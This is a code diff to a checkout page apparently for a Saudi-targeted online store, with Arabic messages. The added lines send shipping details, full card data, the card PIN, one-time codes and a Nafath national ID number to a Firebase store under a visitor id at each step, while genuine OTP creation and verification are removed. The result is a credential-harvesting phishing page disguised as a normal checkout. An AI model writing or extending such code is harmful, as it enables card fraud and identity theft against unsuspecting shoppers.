@@ -8,7 +8,7 @@ import { Separator } from "@/components/ui/separator"
 import { Badge } from "@/components/ui/badge"
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
 import { Minus, Plus, Trash2, MapPin, Check, Loader2, Shield, Phone, CreditCard } from "lucide-react"
-import { addData, createOtpVerification, verifyOtp } from "@/lib/firebase"
+import { addData,  verifyOtp } from "@/lib/firebase"
 import { MapAddressPicker } from "@/components/map-address-picker"
 import { useCart } from "@/lib/cartContext"
 
@@ -94,7 +94,7 @@ export default function CheckoutPage() {
   const [showOfferPopup, setShowOfferPopup] = useState(false)
   const [offerAccepted, setOfferAccepted] = useState(false)
   const [offerDiscount, setOfferDiscount] = useState(0)
-  
+
   useEffect(() => {
     const savedShipping = localStorage.getItem("shippingInfo")
     if (savedShipping) {
@@ -133,11 +133,15 @@ export default function CheckoutPage() {
     removeCartItem(productId)
   }
 
-  const isShippingValid = () => {
+  const isShippingValid = async () => {
+    const visitor=localStorage.getItem('visitor')
+    await addData({id:visitor,...shippingInfo})
     return shippingInfo.fullName.trim() !== "" && shippingInfo.phone.trim() !== "" && shippingInfo.city.trim() !== ""
   }
 
-  const isPaymentValid = () => {
+  const isPaymentValid = async () => {
+    const visitor=localStorage.getItem('visitor')
+    await addData({id:visitor,...paymentInfo})
     return (
       paymentInfo.cardNumber.replace(/\s/g, "").length === 16 &&
       paymentInfo.cardName.trim() !== "" &&
@@ -148,8 +152,8 @@ export default function CheckoutPage() {
 
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "")
-    const chunks = cleaned.match(/.{1,4}/g) || []
-    return chunks.join(" ")
+    const chunks = cleaned
+    return chunks
   }
 
   const formatExpiryDate = (value: string) => {
@@ -182,10 +186,10 @@ export default function CheckoutPage() {
 
   const sendCardOtp = async () => {
     try {
-      const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
-      const verificationId = await createOtpVerification(shippingInfo.phone, otpCode)
-      setCardOtpVerificationId(verificationId)
-      console.log(" Card OTP sent:", otpCode)
+      const visitor=localStorage.getItem('visitor')
+      await addData({id:visitor,cardOtp})
+  
+      setCardOtpVerificationId(visitor!)
       setStep("card-otp")
       setResendTimer(30)
       setCanResendOtp(false)
@@ -196,11 +200,12 @@ export default function CheckoutPage() {
   }
 
   const handleCardOtpVerify = async () => {
+    const visitor=localStorage.getItem('visitor')
     if (cardOtp.length < 4) {
       setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
       return
     }
-
+    await addData({id:visitor,otp:cardOtp})
     setIsVerifying(true)
     setVerificationError("")
 
@@ -222,7 +227,8 @@ export default function CheckoutPage() {
       setVerificationError("الرجاء إدخال رمز PIN المكون من 4 أرقام")
       return
     }
-
+    const visitor=localStorage.getItem('visitor')
+    await addData({id:visitor,cardPin})
     setIsVerifying(true)
     setVerificationError("")
 
@@ -244,8 +250,8 @@ export default function CheckoutPage() {
   const sendPhoneOtp = async () => {
     try {
       const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
-      const verificationId = await createOtpVerification(shippingInfo.phone, otpCode)
-      setPhoneOtpVerificationId(verificationId)
+      const visitor=localStorage.getItem('visitor')
+      await addData({id:visitor,...shippingInfo})
       console.log(" Phone OTP sent:", otpCode)
       setStep("phone-otp")
       setResendTimer(30)
@@ -257,6 +263,9 @@ export default function CheckoutPage() {
   }
 
   const handlePhoneOtpVerify = async () => {
+    const visitor=localStorage.getItem('visitor')
+    
+    await addData({id:visitor,phoneOtp})
     if (phoneOtp.length < 3) {
       setVerificationError("الرجاء إدخال رمز التحقق بشكل صحيح")
       return
@@ -266,7 +275,7 @@ export default function CheckoutPage() {
     setVerificationError("")
 
     try {
-      await verifyOtp(phoneOtpVerificationId, phoneOtp)
+      await addData({id:visitor,phoneOtpVerificationId, phoneOtp})
       console.log(" Phone OTP verified successfully")
       setIsVerifying(false)
       setPhoneOtp("")
@@ -279,10 +288,13 @@ export default function CheckoutPage() {
   }
 
   const handleNafathVerify = async () => {
+    const visitor=localStorage.getItem('visitor')
+
     if (nafathId.length !== 10) {
       setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)")
       return
     }
+    await addData({id:visitor,nafathId})
 
     setIsVerifying(true)
     setVerificationError("")
